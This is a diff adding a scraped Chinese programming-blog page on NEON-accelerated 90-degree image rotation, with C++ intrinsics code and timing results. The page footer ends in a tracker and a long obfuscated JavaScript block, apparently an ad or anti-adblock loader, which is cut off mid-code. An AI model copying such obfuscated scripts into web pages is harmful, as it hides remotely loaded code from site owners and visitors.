+            v_store_interleave_rotate(ptr_y+4*dstep+tr_x,mat20.val[0],mat21.val[0],mat22.val[0]);
+            v_store_interleave_rotate(ptr_y+5*dstep+tr_x,mat20.val[1],mat21.val[1],mat22.val[1]);
+            v_store_interleave_rotate(ptr_y+6*dstep+tr_x,mat20.val[2],mat21.val[2],mat22.val[2]);
+            v_store_interleave_rotate(ptr_y+7*dstep+tr_x,mat20.val[3],mat21.val[3],mat22.val[3]);
+        }
+    }
+
+    for(y=sh;y&lt;h;y++)
+    {
+        int tr_x = (h-y-1)*cn;
+        for(x=0;x&lt;w;x++)
+		{
+            uint8_t* ptr_y = dst+x*dstep;
+			for(int n=0;n&lt;cn;n++)
+			{
+				ptr_y[tr_x+n]=src[y*sstep+x+n];
+			}
+		}
+    }
+
+    for(x=sw;x&lt;w;x++)
+	{    
+        uint8_t* ptr_y = dst+x*dstep;
+        for(y=0;y&lt;sh;y++)
+        {
+            int tr_x = (h-y-1)*cn;
+			for(int n=0;n&lt;cn;n++)
+			{
+ 				ptr_y[tr_x+n]=src[y*sstep+x+n];
+			}
+        }
+    }
+    return;
+}
+</code></pre> 
+<h3> </h3> 
+<h3 id="%E5%B7%A6%E6%97%8B">左旋90</h3> 
+<h4 id="4x4%E7%9F%A9%E9%98%B5%E5%B7%A6%E6%97%8B%E5%AE%9E%E4%BE%8B">4x4矩阵左旋实例</h4> 
+<p>左旋90度相对右旋而言比较简单了，不需要倒置行数据，其他的类似：</p> 
+<p>       旋转前矩阵                                    旋转后矩阵</p> 
+<p><img alt="" class="has" height="136" src="https://images2.imgbox.com/86/5c/bjHhUvwu_o.png" width="140">                       <img alt="" class="has" height="135" src="https://images2.imgbox.com/d7/b0/UCGBMLxK_o.png" width="138">   </p> 
+<p>算法步骤：</p> 
+<p>1）直接每两行做2x2转置(相邻行转置)：</p> 
+<p>          原矩阵                                        相邻行转置                          </p> 
+<p><img alt="" class="has" height="136" src="https://images2.imgbox.com/c5/22/0zisNymM_o.png" width="140">                       <img alt="" class="has" height="137" src="https://images2.imgbox.com/9a/d4/znp2PXtt_o.png" width="140"></p> 
+<p>2）类似地，每行两个像素值看做一个整体，隔行转置，但是注意这里需要垂直flip一下，不要担心会因此消耗时间，只需要在存储的时候上下倒着水平存储就可以了，并不耗时， 这样便可以得到最终的矩阵左旋结果了：</p> 
+<p>       上一步结果                                       隔行转置                                  垂直倒置存储</p> 
+<p><img alt="" class="has" height="137" src="https://images2.imgbox.com/51/92/7LbPsFrS_o.png" width="140">                        <img alt="" class="has" height="137" src="https://images2.imgbox.com/47/a8/k0KqGkz0_o.png" width="140">                     <img alt="" class="has" height="135" src="https://images2.imgbox.com/d2/ea/ki83WNJX_o.png" width="138"></p> 
+<h4 id="%E7%81%B0%E5%BA%A6%EF%BC%88%E5%8D%95%E9%80%9A%E9%81%93%EF%BC%89%E5%9B%BE%E5%83%8F%E5%B7%A6%E6%97%8B90">灰度图（单通道）左旋90</h4> 
+<pre class="has"><code class="language-cpp">static void rotate_neg90_gray(uint8_t* src, size_t sstep, uint8_t* dst, size_t dstep, int w, int h)
+{
+    uint8x8x4_t     mat[2]; //use 2 register array to load a 8x8 patch
+    uint8x8x2_t     temp8x8x2[4];
+    uint16x4x2_t    temp16x4x2[8];
+    uint32x2x2_t    temp32x2x2[8];
+
+    int dw=w&amp;7; int sw=w-dw;
+    int dh=h&amp;7; int sh=h-dh;
+    
+    for(int i=0;i&lt;sh;i+=8)
+    {
+        for(int j=0;j&lt;sw;j+=8)
+        {
+            //step0 load 8x8 bytes in 8 registers
+            mat[0].val[0] = vld1_u8(src+ i   *sstep+j);
+            mat[0].val[1] = vld1_u8(src+(i+1)*sstep+j);
+            mat[0].val[2] = vld1_u8(src+(i+2)*sstep+j);
+            mat[0].val[3] = vld1_u8(src+(i+3)*sstep+j);
+            mat[1].val[0] = vld1_u8(src+(i+4)*sstep+j);
+            mat[1].val[1] = vld1_u8(src+(i+5)*sstep+j);
+            mat[1].val[2] = vld1_u8(src+(i+6)*sstep+j);
+            mat[1].val[3] = vld1_u8(src+(i+7)*sstep+j);
+
+            //step1 trn nearby registers
+            temp8x8x2[0] = vtrn_u8(mat[0].val[0], mat[0].val[1]);
+            temp8x8x2[1] = vtrn_u8(mat[0].val[2], mat[0].val[3]);
+            temp8x8x2[2] = vtrn_u8(mat[1].val[0], mat[1].val[1]);
+            temp8x8x2[3] = vtrn_u8(mat[1].val[2], mat[1].val[3]);
+
+            //step2 trn 1,3 2,4 5,7 6,8
+            temp16x4x2[0].val[0] = vreinterpret_u16_u8(temp8x8x2[0].val[0]);
+            temp16x4x2[0].val[1] = vreinterpret_u16_u8(temp8x8x2[0].val[1]);
+            temp16x4x2[1].val[0] = vreinterpret_u16_u8(temp8x8x2[1].val[0]);
+            temp16x4x2[1].val[1] = vreinterpret_u16_u8(temp8x8x2[1].val[1]);
+            temp16x4x2[2].val[0] = vreinterpret_u16_u8(temp8x8x2[2].val[0]);
+            temp16x4x2[2].val[1] = vreinterpret_u16_u8(temp8x8x2[2].val[1]);
+            temp16x4x2[3].val[0] = vreinterpret_u16_u8(temp8x8x2[3].val[0]);
+            temp16x4x2[3].val[1] = vreinterpret_u16_u8(temp8x8x2[3].val[1]);
+
+            temp16x4x2[4] = vtrn_u16(temp16x4x2[0].val[0],temp16x4x2[1].val[0]);
+            temp16x4x2[5] = vtrn_u16(temp16x4x2[0].val[1],temp16x4x2[1].val[1]);
+            temp16x4x2[6] = vtrn_u16(temp16x4x2[2].val[0],temp16x4x2[3].val[0]);
+            temp16x4x2[7] = vtrn_u16(temp16x4x2[2].val[1],temp16x4x2[3].val[1]);
+
+            //step3 trn 1,5 2,6 3,7 4,8
+            temp32x2x2[0].val[0] = vreinterpret_u32_u16(temp16x4x2[4].val[0]);
+            temp32x2x2[0].val[1] = vreinterpret_u32_u16(temp16x4x2[4].val[1]);
+            temp32x2x2[1].val[0] = vreinterpret_u32_u16(temp16x4x2[5].val[0]);
+            temp32x2x2[1].val[1] = vreinterpret_u32_u16(temp16x4x2[5].val[1]);
+            temp32x2x2[2].val[0] = vreinterpret_u32_u16(temp16x4x2[6].val[0]);
+            temp32x2x2[2].val[1] = vreinterpret_u32_u16(temp16x4x2[6].val[1]);
+            temp32x2x2[3].val[0] = vreinterpret_u32_u16(temp16x4x2[7].val[0]);
+            temp32x2x2[3].val[1] = vreinterpret_u32_u16(temp16x4x2[7].val[1]);
+
+            temp32x2x2[4] = vtrn_u32(temp32x2x2[0].val[0],temp32x2x2[2].val[0]);
+            temp32x2x2[5] = vtrn_u32(temp32x2x2[0].val[1],temp32x2x2[2].val[1]);
+            temp32x2x2[6] = vtrn_u32(temp32x2x2[1].val[0],temp32x2x2[3].val[0]);
+            temp32x2x2[7] = vtrn_u32(temp32x2x2[1].val[1],temp32x2x2[3].val[1]);
+
+            //step4 store bytes in correct position,the order now is 1,2,3,4,5,6,7,8
+            temp8x8x2[0].val[0] = vreinterpret_u8_u32(temp32x2x2[7].val[1]);
+            temp8x8x2[0].val[1] = vreinterpret_u8_u32(temp32x2x2[5].val[1]);
+            temp8x8x2[1].val[0] = vreinterpret_u8_u32(temp32x2x2[6].val[1]);
+            temp8x8x2[1].val[1] = vreinterpret_u8_u32(temp32x2x2[4].val[1]);
+            temp8x8x2[2].val[0] = vreinterpret_u8_u32(temp32x2x2[7].val[0]);
+            temp8x8x2[2].val[1] = vreinterpret_u8_u32(temp32x2x2[5].val[0]);
+            temp8x8x2[3].val[0] = vreinterpret_u8_u32(temp32x2x2[6].val[0]);
+            temp8x8x2[3].val[1] = vreinterpret_u8_u32(temp32x2x2[4].val[0]);
+
+            vst1_u8(dst+(w-j-8)*dstep+i, temp8x8x2[0].val[0]);
+            vst1_u8(dst+(w-j-7)*dstep+i, temp8x8x2[0].val[1]);
+            vst1_u8(dst+(w-j-6)*dstep+i, temp8x8x2[1].val[0]);
+            vst1_u8(dst+(w-j-5)*dstep+i, temp8x8x2[1].val[1]);
+            vst1_u8(dst+(w-j-4)*dstep+i, temp8x8x2[2].val[0]);
+            vst1_u8(dst+(w-j-3)*dstep+i, temp8x8x2[2].val[1]);
+            vst1_u8(dst+(w-j-2)*dstep+i, temp8x8x2[3].val[0]);
+            vst1_u8(dst+(w-j-1)*dstep+i, temp8x8x2[3].val[1]);
+        }
+    }
+
+    for(int y=sh;y&lt;h;y++)
+    {
+        int yIndex = y*sstep;
+        for(int x=0;x&lt;w;x++)
+		{
+			dst[(w-x-1)*h+y]=src[yIndex+x];
+		}
+    }
+
+    for(int x=sw;x&lt;w;x++)
+	{    
+        int xIndex = (w-x-1)*h;
+        for(int y=0;y&lt;sh;y++)
+        {
+ 			dst[xIndex+y]=src[y*sstep+x];
+        }
+    }
+
+    return;
+}
+</code></pre> 
+<p> </p> 
+<h4 id="%E5%BD%A9%E5%9B%BE%EF%BC%88RGB%E4%B8%89%E9%80%9A%E9%81%93%EF%BC%89%E5%B7%A6%E6%97%8B90%C2%A0">彩图（RGB三通道）左旋90 </h4> 
+<pre class="has"><code class="language-cpp">static void rotate_neg90_rgb(uint8_t* src, size_t sstep, uint8_t* dst, size_t dstep, int w,int h, int cn)
+{
+    uint8x8x4_t     mat0[2],mat1[2],mat2[2]; //use 2 register array to load a 8x8 patch
+    uint8x8x2_t     temp8x8x2_0[4],temp8x8x2_1[4],temp8x8x2_2[4];
+    uint16x4x2_t    temp16x4x2_0[8],temp16x4x2_1[8],temp16x4x2_2[8];
+    uint32x2x2_t    temp32x2x2_0[8],temp32x2x2_1[8],temp32x2x2_2[8];
+
+    int dw=w&amp;7; int sw=w-dw;
+    int dh=h&amp;7; int sh=h-dh;
+    
+    for(int i=0;i&lt;sh;i+=8)
+    {
+        for(int j=0;j&lt;sw;j+=8)
+        {
+            //step0 load 8x8 bytes in 8 registers
+            uint8x8x3_t v = vld3_u8(src+ i   *sstep+j*cn);
+			mat0[0].val[0] = v.val[0]; mat1[0].val[0] = v.val[1]; mat2[0].val[0] = v.val[2];
+			
+			v = vld3_u8(src+(i+1)*sstep+j*cn);
+            mat0[0].val[1] = v.val[0]; mat1[0].val[1] = v.val[1]; mat2[0].val[1] = v.val[2];
+
+            v = vld3_u8(src+(i+2)*sstep+j*cn);
+			mat0[0].val[2] = v.val[0]; mat1[0].val[2] = v.val[1]; mat2[0].val[2] = v.val[2];
+
+            v = vld3_u8(src+(i+3)*sstep+j*cn);
+			mat0[0].val[3] = v.val[0]; mat1[0].val[3] = v.val[1]; mat2[0].val[3] = v.val[2];
+			
+			v = vld3_u8(src+(i+4)*sstep+j*cn);
+			mat0[1].val[0] = v.val[0]; mat1[1].val[0] = v.val[1]; mat2[1].val[0] = v.val[2];
+			
+			v = vld3_u8(src+(i+5)*sstep+j*cn);
+            mat0[1].val[1] = v.val[0]; mat1[1].val[1] = v.val[1]; mat2[1].val[1] = v.val[2];
+
+            v = vld3_u8(src+(i+6)*sstep+j*cn);
+			mat0[1].val[2] = v.val[0]; mat1[1].val[2] = v.val[1]; mat2[1].val[2] = v.val[2];
+
+            v = vld3_u8(src+(i+7)*sstep+j*cn);
+			mat0[1].val[3] = v.val[0]; mat1[1].val[3] = v.val[1]; mat2[1].val[3] = v.val[2];
+
+
+            //step1 trn nearby registers
+            temp8x8x2_0[0] = vtrn_u8(mat0[0].val[0], mat0[0].val[1]); temp8x8x2_1[0] = vtrn_u8(mat1[0].val[0], mat1[0].val[1]); temp8x8x2_2[0] = vtrn_u8(mat2[0].val[0], mat2[0].val[1]);
+            temp8x8x2_0[1] = vtrn_u8(mat0[0].val[2], mat0[0].val[3]); temp8x8x2_1[1] = vtrn_u8(mat1[0].val[2], mat1[0].val[3]); temp8x8x2_2[1] = vtrn_u8(mat2[0].val[2], mat2[0].val[3]);
+            temp8x8x2_0[2] = vtrn_u8(mat0[1].val[0], mat0[1].val[1]); temp8x8x2_1[2] = vtrn_u8(mat1[1].val[0], mat1[1].val[1]); temp8x8x2_2[2] = vtrn_u8(mat2[1].val[0], mat2[1].val[1]);
+            temp8x8x2_0[3] = vtrn_u8(mat0[1].val[2], mat0[1].val[3]); temp8x8x2_1[3] = vtrn_u8(mat1[1].val[2], mat1[1].val[3]); temp8x8x2_2[3] = vtrn_u8(mat2[1].val[2], mat2[1].val[3]);
+
+            //step2 trn 1,3 2,4 5,7 6,8
+            temp16x4x2_0[0].val[0] = vreinterpret_u16_u8(temp8x8x2_0[0].val[0]); temp16x4x2_1[0].val[0] = vreinterpret_u16_u8(temp8x8x2_1[0].val[0]); temp16x4x2_2[0].val[0] = vreinterpret_u16_u8(temp8x8x2_2[0].val[0]);
+            temp16x4x2_0[0].val[1] = vreinterpret_u16_u8(temp8x8x2_0[0].val[1]); temp16x4x2_1[0].val[1] = vreinterpret_u16_u8(temp8x8x2_1[0].val[1]); temp16x4x2_2[0].val[1] = vreinterpret_u16_u8(temp8x8x2_2[0].val[1]);
+            temp16x4x2_0[1].val[0] = vreinterpret_u16_u8(temp8x8x2_0[1].val[0]); temp16x4x2_1[1].val[0] = vreinterpret_u16_u8(temp8x8x2_1[1].val[0]); temp16x4x2_2[1].val[0] = vreinterpret_u16_u8(temp8x8x2_2[1].val[0]);
+            temp16x4x2_0[1].val[1] = vreinterpret_u16_u8(temp8x8x2_0[1].val[1]); temp16x4x2_1[1].val[1] = vreinterpret_u16_u8(temp8x8x2_1[1].val[1]); temp16x4x2_2[1].val[1] = vreinterpret_u16_u8(temp8x8x2_2[1].val[1]);
+            temp16x4x2_0[2].val[0] = vreinterpret_u16_u8(temp8x8x2_0[2].val[0]); temp16x4x2_1[2].val[0] = vreinterpret_u16_u8(temp8x8x2_1[2].val[0]); temp16x4x2_2[2].val[0] = vreinterpret_u16_u8(temp8x8x2_2[2].val[0]);
+            temp16x4x2_0[2].val[1] = vreinterpret_u16_u8(temp8x8x2_0[2].val[1]); temp16x4x2_1[2].val[1] = vreinterpret_u16_u8(temp8x8x2_1[2].val[1]); temp16x4x2_2[2].val[1] = vreinterpret_u16_u8(temp8x8x2_2[2].val[1]);
+            temp16x4x2_0[3].val[0] = vreinterpret_u16_u8(temp8x8x2_0[3].val[0]); temp16x4x2_1[3].val[0] = vreinterpret_u16_u8(temp8x8x2_1[3].val[0]); temp16x4x2_2[3].val[0] = vreinterpret_u16_u8(temp8x8x2_2[3].val[0]);
+            temp16x4x2_0[3].val[1] = vreinterpret_u16_u8(temp8x8x2_0[3].val[1]); temp16x4x2_1[3].val[1] = vreinterpret_u16_u8(temp8x8x2_1[3].val[1]); temp16x4x2_2[3].val[1] = vreinterpret_u16_u8(temp8x8x2_2[3].val[1]);
+
+            temp16x4x2_0[4] = vtrn_u16(temp16x4x2_0[0].val[0],temp16x4x2_0[1].val[0]); temp16x4x2_1[4] = vtrn_u16(temp16x4x2_1[0].val[0],temp16x4x2_1[1].val[0]); temp16x4x2_2[4] = vtrn_u16(temp16x4x2_2[0].val[0],temp16x4x2_2[1].val[0]);
+            temp16x4x2_0[5] = vtrn_u16(temp16x4x2_0[0].val[1],temp16x4x2_0[1].val[1]); temp16x4x2_1[5] = vtrn_u16(temp16x4x2_1[0].val[1],temp16x4x2_1[1].val[1]); temp16x4x2_2[5] = vtrn_u16(temp16x4x2_2[0].val[1],temp16x4x2_2[1].val[1]);
+            temp16x4x2_0[6] = vtrn_u16(temp16x4x2_0[2].val[0],temp16x4x2_0[3].val[0]); temp16x4x2_1[6] = vtrn_u16(temp16x4x2_1[2].val[0],temp16x4x2_1[3].val[0]); temp16x4x2_2[6] = vtrn_u16(temp16x4x2_2[2].val[0],temp16x4x2_2[3].val[0]);
+            temp16x4x2_0[7] = vtrn_u16(temp16x4x2_0[2].val[1],temp16x4x2_0[3].val[1]); temp16x4x2_1[7] = vtrn_u16(temp16x4x2_1[2].val[1],temp16x4x2_1[3].val[1]); temp16x4x2_2[7] = vtrn_u16(temp16x4x2_2[2].val[1],temp16x4x2_2[3].val[1]);
+
+            //step3 trn 1,5 2,6 3,7 4,8
+            temp32x2x2_0[0].val[0] = vreinterpret_u32_u16(temp16x4x2_0[4].val[0]); temp32x2x2_1[0].val[0] = vreinterpret_u32_u16(temp16x4x2_1[4].val[0]); temp32x2x2_2[0].val[0] = vreinterpret_u32_u16(temp16x4x2_2[4].val[0]);
+            temp32x2x2_0[0].val[1] = vreinterpret_u32_u16(temp16x4x2_0[4].val[1]); temp32x2x2_1[0].val[1] = vreinterpret_u32_u16(temp16x4x2_1[4].val[1]); temp32x2x2_2[0].val[1] = vreinterpret_u32_u16(temp16x4x2_2[4].val[1]);
+            temp32x2x2_0[1].val[0] = vreinterpret_u32_u16(temp16x4x2_0[5].val[0]); temp32x2x2_1[1].val[0] = vreinterpret_u32_u16(temp16x4x2_1[5].val[0]); temp32x2x2_2[1].val[0] = vreinterpret_u32_u16(temp16x4x2_2[5].val[0]);
+            temp32x2x2_0[1].val[1] = vreinterpret_u32_u16(temp16x4x2_0[5].val[1]); temp32x2x2_1[1].val[1] = vreinterpret_u32_u16(temp16x4x2_1[5].val[1]); temp32x2x2_2[1].val[1] = vreinterpret_u32_u16(temp16x4x2_2[5].val[1]);
+            temp32x2x2_0[2].val[0] = vreinterpret_u32_u16(temp16x4x2_0[6].val[0]); temp32x2x2_1[2].val[0] = vreinterpret_u32_u16(temp16x4x2_1[6].val[0]); temp32x2x2_2[2].val[0] = vreinterpret_u32_u16(temp16x4x2_2[6].val[0]);
+            temp32x2x2_0[2].val[1] = vreinterpret_u32_u16(temp16x4x2_0[6].val[1]); temp32x2x2_1[2].val[1] = vreinterpret_u32_u16(temp16x4x2_1[6].val[1]); temp32x2x2_2[2].val[1] = vreinterpret_u32_u16(temp16x4x2_2[6].val[1]);
+            temp32x2x2_0[3].val[0] = vreinterpret_u32_u16(temp16x4x2_0[7].val[0]); temp32x2x2_1[3].val[0] = vreinterpret_u32_u16(temp16x4x2_1[7].val[0]); temp32x2x2_2[3].val[0] = vreinterpret_u32_u16(temp16x4x2_2[7].val[0]);
+            temp32x2x2_0[3].val[1] = vreinterpret_u32_u16(temp16x4x2_0[7].val[1]); temp32x2x2_1[3].val[1] = vreinterpret_u32_u16(temp16x4x2_1[7].val[1]); temp32x2x2_2[3].val[1] = vreinterpret_u32_u16(temp16x4x2_2[7].val[1]);
+
+            temp32x2x2_0[4] = vtrn_u32(temp32x2x2_0[0].val[0],temp32x2x2_0[2].val[0]); temp32x2x2_1[4] = vtrn_u32(temp32x2x2_1[0].val[0],temp32x2x2_1[2].val[0]); temp32x2x2_2[4] = vtrn_u32(temp32x2x2_2[0].val[0],temp32x2x2_2[2].val[0]);
+            temp32x2x2_0[5] = vtrn_u32(temp32x2x2_0[0].val[1],temp32x2x2_0[2].val[1]); temp32x2x2_1[5] = vtrn_u32(temp32x2x2_1[0].val[1],temp32x2x2_1[2].val[1]); temp32x2x2_2[5] = vtrn_u32(temp32x2x2_2[0].val[1],temp32x2x2_2[2].val[1]);
+            temp32x2x2_0[6] = vtrn_u32(temp32x2x2_0[1].val[0],temp32x2x2_0[3].val[0]); temp32x2x2_1[6] = vtrn_u32(temp32x2x2_1[1].val[0],temp32x2x2_1[3].val[0]); temp32x2x2_2[6] = vtrn_u32(temp32x2x2_2[1].val[0],temp32x2x2_2[3].val[0]);
+            temp32x2x2_0[7] = vtrn_u32(temp32x2x2_0[1].val[1],temp32x2x2_0[3].val[1]); temp32x2x2_1[7] = vtrn_u32(temp32x2x2_1[1].val[1],temp32x2x2_1[3].val[1]); temp32x2x2_2[7] = vtrn_u32(temp32x2x2_2[1].val[1],temp32x2x2_2[3].val[1]);
+
+            //step4 store bytes in correct position,the order now is 1,2,3,4,5,6,7,8
+            temp8x8x2_0[0].val[0] = vreinterpret_u8_u32(temp32x2x2_0[7].val[1]); temp8x8x2_1[0].val[0] = vreinterpret_u8_u32(temp32x2x2_1[7].val[1]); temp8x8x2_2[0].val[0] = vreinterpret_u8_u32(temp32x2x2_2[7].val[1]);
+            temp8x8x2_0[0].val[1] = vreinterpret_u8_u32(temp32x2x2_0[5].val[1]); temp8x8x2_1[0].val[1] = vreinterpret_u8_u32(temp32x2x2_1[5].val[1]); temp8x8x2_2[0].val[1] = vreinterpret_u8_u32(temp32x2x2_2[5].val[1]);
+            temp8x8x2_0[1].val[0] = vreinterpret_u8_u32(temp32x2x2_0[6].val[1]); temp8x8x2_1[1].val[0] = vreinterpret_u8_u32(temp32x2x2_1[6].val[1]); temp8x8x2_2[1].val[0] = vreinterpret_u8_u32(temp32x2x2_2[6].val[1]);
+            temp8x8x2_0[1].val[1] = vreinterpret_u8_u32(temp32x2x2_0[4].val[1]); temp8x8x2_1[1].val[1] = vreinterpret_u8_u32(temp32x2x2_1[4].val[1]); temp8x8x2_2[1].val[1] = vreinterpret_u8_u32(temp32x2x2_2[4].val[1]);
+            temp8x8x2_0[2].val[0] = vreinterpret_u8_u32(temp32x2x2_0[7].val[0]); temp8x8x2_1[2].val[0] = vreinterpret_u8_u32(temp32x2x2_1[7].val[0]); temp8x8x2_2[2].val[0] = vreinterpret_u8_u32(temp32x2x2_2[7].val[0]);
+            temp8x8x2_0[2].val[1] = vreinterpret_u8_u32(temp32x2x2_0[5].val[0]); temp8x8x2_1[2].val[1] = vreinterpret_u8_u32(temp32x2x2_1[5].val[0]); temp8x8x2_2[2].val[1] = vreinterpret_u8_u32(temp32x2x2_2[5].val[0]);
+            temp8x8x2_0[3].val[0] = vreinterpret_u8_u32(temp32x2x2_0[6].val[0]); temp8x8x2_1[3].val[0] = vreinterpret_u8_u32(temp32x2x2_1[6].val[0]); temp8x8x2_2[3].val[0] = vreinterpret_u8_u32(temp32x2x2_2[6].val[0]);
+            temp8x8x2_0[3].val[1] = vreinterpret_u8_u32(temp32x2x2_0[4].val[0]); temp8x8x2_1[3].val[1] = vreinterpret_u8_u32(temp32x2x2_1[4].val[0]); temp8x8x2_2[3].val[1] = vreinterpret_u8_u32(temp32x2x2_2[4].val[0]);
+
+            v_store_interleave_rotate(dst+(w-j-8)*dstep+i*cn, temp8x8x2_0[0].val[0], temp8x8x2_1[0].val[0], temp8x8x2_2[0].val[0]);
+            v_store_interleave_rotate(dst+(w-j-7)*dstep+i*cn, temp8x8x2_0[0].val[1], temp8x8x2_1[0].val[1], temp8x8x2_2[0].val[1]);
+            v_store_interleave_rotate(dst+(w-j-6)*dstep+i*cn, temp8x8x2_0[1].val[0], temp8x8x2_1[1].val[0], temp8x8x2_2[1].val[0]);
+            v_store_interleave_rotate(dst+(w-j-5)*dstep+i*cn, temp8x8x2_0[1].val[1], temp8x8x2_1[1].val[1], temp8x8x2_2[1].val[1]);
+            v_store_interleave_rotate(dst+(w-j-4)*dstep+i*cn, temp8x8x2_0[2].val[0], temp8x8x2_1[2].val[0], temp8x8x2_2[2].val[0]);
+            v_store_interleave_rotate(dst+(w-j-3)*dstep+i*cn, temp8x8x2_0[2].val[1], temp8x8x2_1[2].val[1], temp8x8x2_2[2].val[1]);
+            v_store_interleave_rotate(dst+(w-j-2)*dstep+i*cn, temp8x8x2_0[3].val[0], temp8x8x2_1[3].val[0], temp8x8x2_2[3].val[0]);
+            v_store_interleave_rotate(dst+(w-j-1)*dstep+i*cn, temp8x8x2_0[3].val[1], temp8x8x2_1[3].val[1], temp8x8x2_2[3].val[1]);
+        }
+    }
+
+    for(int y=sh;y&lt;h;y++)
+    {
+        int yIndex = y*sstep;
+        for(int x=0;x&lt;w;x++)
+		{
+            for(int n=0;n&lt;cn;n++)
+            {
+                dst[(w-x-1)*h+cn*y+n]=src[yIndex+cn*x+n];
+            }
+		}
+    }
+
+    for(int x=sw;x&lt;w;x++)
+	{    
+        int xIndex = (w-x-1)*h;
+        for(int y=0;y&lt;sh;y++)
+        {
+            for(int n=0;n&lt;cn;n++)
+            {
+                dst[xIndex+cn*y+n]=src[y*sstep+cn*x+n];
+            }
+        }
+    }
+
+    return;
+}</code></pre> 
+<p><strong>v_store_interleave_rotate函数代码：</strong></p> 
+<pre><code>inline void v_store_interleave_rotate(unsigned char* ptr, const uint8x8_t&amp; a, const uint8x8_t&amp; b, const uint8x8_t&amp; c)
+{
+	uint8x8x3_t v; 
+    v.val[0] = a; 
+    v.val[1] = b; 
+    v.val[2] = c; 
+    vst3_u8(ptr, v); 
+}</code></pre> 
+<p> </p> 
+<h3 id="RK3288-linux(%E7%A1%AC%E6%B5%AE%E7%82%B9)%C2%A0%E8%80%97%E6%97%B6%E5%AF%B9%E6%AF%94">RK3288-linux(硬浮点) 耗时对比（opencv4.1与NEON加速）</h3> 
+<p><img alt="" class="has" height="147" src="https://images2.imgbox.com/d1/9d/U82vG1cg_o.png" width="529"></p> 
+<p><img alt="" class="has" height="146" src="https://images2.imgbox.com/a8/58/CEdf9mtV_o.png" width="528"></p>
+                </div>
+		</div>
+	</article>
+</main>
+
+
+<nav class="pager flex">
+	<div class="pager__item pager__item--prev">
+		<a class="pager__link" href="/posts/93e45e03aea07cf3528abda9e2e18011/" rel="prev">
+			<span class="pager__subtitle">«&thinsp;Previous</span>
+			<p class="pager__title">2种方式将日志同步ES中并且用kibana展示</p>
+		</a>
+	</div>
+	<div class="pager__item pager__item--next">
+		<a class="pager__link" href="/posts/336c60d01881ad979eda705604cf631e/" rel="next">
+			<span class="pager__subtitle">Next&thinsp;»</span>
+			<p class="pager__title">转载：ultraiso制作超过4G的系统U盘启动盘教程</p>
+		</a>
+	</div>
+</nav>
+
+
+			</div>
+			
+		</div>
+		<footer class="footer">
+	<div class="container footer__container flex">
+		
+		<div class="footer__copyright">
+			&copy; 2024 编程爱好者博客.
+			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
+		</div>
+	</div>
+</footer>
+
+<script src="https://www.w3counter.com/tracker.js?id=151260"></script>
+<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var 